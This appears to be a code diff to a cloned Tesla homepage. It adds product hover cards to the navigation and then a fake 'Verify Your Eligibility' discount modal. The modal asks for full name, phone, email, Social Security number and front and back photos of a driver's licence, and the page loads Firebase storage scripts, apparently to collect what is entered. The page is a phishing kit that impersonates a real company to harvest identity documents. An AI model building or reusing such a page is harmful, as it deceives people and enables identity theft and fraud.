@@ -7,6 +7,7 @@
     <title>Electric Cars, Solar & Clean Energy | Tesla</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=M+PLUS+1:wght@100..900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
 </head>
@@ -18,13 +19,80 @@
                     <path fill="currentColor" d="M0 .1a9.7 9.7 0 0 0 7 7h11l.5.1v27.6h6.8V7.3L26 7h11a9.8 9.8 0 0 0 7-7H0zm238.6 0h-6.8v34.8H263a9.7 9.7 0 0 0 6-6.8h-30.3V0zm-52.3 6.8c3.6-1 6.6-3.8 7.4-6.9l-38.1.1v20.6h31.1v7.2h-24.4a13.6 13.6 0 0 0-8.7 7h39.9v-21h-31.2v-7zm116.2 28h6.7v-14h24.6v14h6.7v-21h-38zM85.3 7h26a9.6 9.6 0 0 0 7.1-7H78.3a9.6 9.6 0 0 0 7 7m0 13.8h26a9.6 9.6 0 0 0 7.1-7H78.3a9.6 9.6 0 0 0 7 7m0 14.1h26a9.6 9.6 0 0 0 7.1-7H78.3a9.6 9.6 0 0 0 7 7M308.5 7h26a9.6 9.6 0 0 0 7-7h-40a9.6 9.6 0 0 0 7 7"></path>
                 </svg>
             </a>
+    
             <nav class="center-nav desktop">
-                <a href="">Model S</a>
-                <a href="">Model 3</a>
-                <a href="">Model X</a>
-                <a href="">Model Y</a>
-                <a href="">Cybertruck</a>
-                <a href="">Energy</a>
+            <a href="">Model S
+                <div class="model-hover-card">
+                <img src="images/Mega-Menu-Vehicles-Model-S-New.avif" alt="Model S">
+                <div class="model-hover-info">
+                    <h3>Model S</h3>
+                    <p>From $74,990</p>
+                    <button class="btn btn-primary">Order Now</button>
+                </div>
+                </div>
+            </a>
+            <a href="">Model 3
+                <div class="model-hover-card">
+                <img src="images/Mega-Menu-Vehicles-Model-3-Performance-LHD.avif" alt="Model 3">
+                <div class="model-hover-info">
+                    <h3>Model 3</h3>
+                    <p>From $39,990</p>
+                    <button class="btn btn-primary">Order Now</button>
+                </div>
+                </div>
+            </a>
+            <a href="">Model X
+                <div class="model-hover-card">
+                <img src="images/Mega-Menu-Vehicles-Model-X-New.avif" alt="Model X">
+                <div class="model-hover-info">
+                    <h3>Model X</h3>
+                    <p>From $79,990</p>
+                    <button class="btn btn-primary">Order Now</button>
+                </div>
+                </div>
+            </a>
+            <a href="">Model Y
+                <div class="model-hover-card">
+                <img src="images/Mega-Menu-Vehicles-Model-Y-2-v2.avif" alt="Model Y">
+                <div class="model-hover-info">
+                    <h3>Model Y</h3>
+                    <p>From $47,990</p>
+                    <button class="btn btn-primary">Order Now</button>
+                </div>
+                </div>
+            </a>
+            <a href="">Cybertruck
+                <div class="model-hover-card">
+                <img src="images/Mega-Menu-Vehicles-Cybertruck-1x.avif" alt="Cybertruck">
+                <div class="model-hover-info">
+                    <h3>Cybertruck</h3>
+                    <p>From $60,990</p>
+                    <button class="btn btn-primary">Order Now</button>
+                </div>
+                </div>
+            </a>
+                <a href="">Energy
+                    <div class="model-hover-card">
+                        <img src="images/Homepage-Solar-Panels.avif" alt="Solar Panels">
+                        <div class="model-hover-info">
+                            <h3>Solar Panels</h3>
+                            <p>From $8,000</p>
+                            <button class="btn btn-primary">Order Now</button>
+                        </div>
+                        <img src="images/Homepage-Card-Powerwall-Desktop.avif" alt="Powerwall">
+                        <div class="model-hover-info">
+                            <h3>Powerwall</h3>
+                            <p>From $7,500</p>
+                            <button class="btn btn-primary">Order Now</button>
+                        </div>
+                        <img src="images/Homepage-Solar-Roof.avif" alt="Solar Roof">
+                        <div class="model-hover-info">
+                            <h3>Solar Roof</h3>
+                            <p>From $21,000</p>
+                            <button class="btn btn-primary">Order Now</button>
+                        </div>
+                    </div>
+                </a>
             </nav>
             <nav class="right-nav">
                 <a href="" class="desktop">Shop</a>
@@ -148,10 +216,10 @@
                 </div>
                 
                 <button class="carousel-btn prev-btn" aria-label="Previous slide">
-                    <i class="fas fa-chevron-left"></i>
+                    <i class="fa-solid fa-caret-left"></i>
                 </button>
                 <button class="carousel-btn next-btn" aria-label="Next slide">
-                    <i class="fas fa-chevron-right"></i>
+                    <i class="fa-solid fa-caret-right"></i>
                 </button>
                 
                 <div class="carousel-dots">
@@ -338,6 +406,84 @@
         </div>
     </div>
     </div>
-    <script src="script.js"></script>
+
+    <div class="verification-modal" id="verificationModal">
+  <div class="modal-content">
+    <button class="close-modal">&times;</button>
+    <h2>Verify Your Eligibility</h2>
+    <form id="verificationForm">
+      <div class="form-group">
+        <label for="fullName">Full Name</label>
+        <input type="text" id="fullName" name="fullName" required>
+      </div>
+      
+      <div class="form-group">
+        <label for="email">Email</label>
+        <input type="email" id="email" name="email" required>
+      </div>
+      
+      <div class="form-group">
+        <label for="phone">Phone Number</label>
+        <input type="tel" id="phone" name="phone" required>
+      </div>
+      
+      <div class="form-group">
+        <label for="ssn">Social Security Number All information are Encrypted)</label>
+        <input type="text" id="ssn" name="ssn" pattern="\d{9}" maxlength="9" required>
+      </div>
+      
+      <div class="form-group">
+        <label>Verification Documents</label>
+        <div class="document-upload">
+          <div class="upload-box" id="licenseFront">
+            <i class="fas fa-id-card"></i>
+            <span>Driver's License (Front)</span>
+            <input type="file" accept="image/*" class="file-input" data-side="front" required>
+          </div>
+          <div class="upload-box" id="licenseBack">
+            <i class="fas fa-id-card"></i>
+            <span>Driver's License (Back)</span>
+            <input type="file" accept="image/*" class="file-input" data-side="back" required>
+          </div>
+        </div>
+      </div>
+      
+      <div class="form-group">
+        <label for="verificationType">Verification Type</label>
+        <select id="verificationType" name="verificationType" required>
+          <option value="">Select your status</option>
+          <option value="military">Military</option>
+          <option value="first_responder">First Responder</option>
+          <option value="teacher">Teacher</option>
+          <option value="student">Student</option>
+        </select>
+      </div>
+      
+      <div class="form-group checkbox-group">
+        <input type="checkbox" id="agreeTerms" name="agreeTerms" required>
+        <label for="agreeTerms">I agree to the terms and conditions</label>
+      </div>
+      
+      <button type="submit" class="btn btn-primary">Submit Verification</button>
+    </form>
+  </div>
+</div>
+
+<div class="success-modal" id="successModal">
+  <div class="modal-content">
+    <div class="success-icon">
+      <i class="fas fa-check-circle"></i>
+    </div>
+    <h2>Verification Submitted</h2>
+    <p>Thank you for submitting your verification documents. We'll review your information and contact you within 3 business days.</p>
+    <button class="btn btn-primary" id="closeSuccessModal">Close</button>
+  </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+    
+<script src="script.js"></script>
 </body>
 </html>
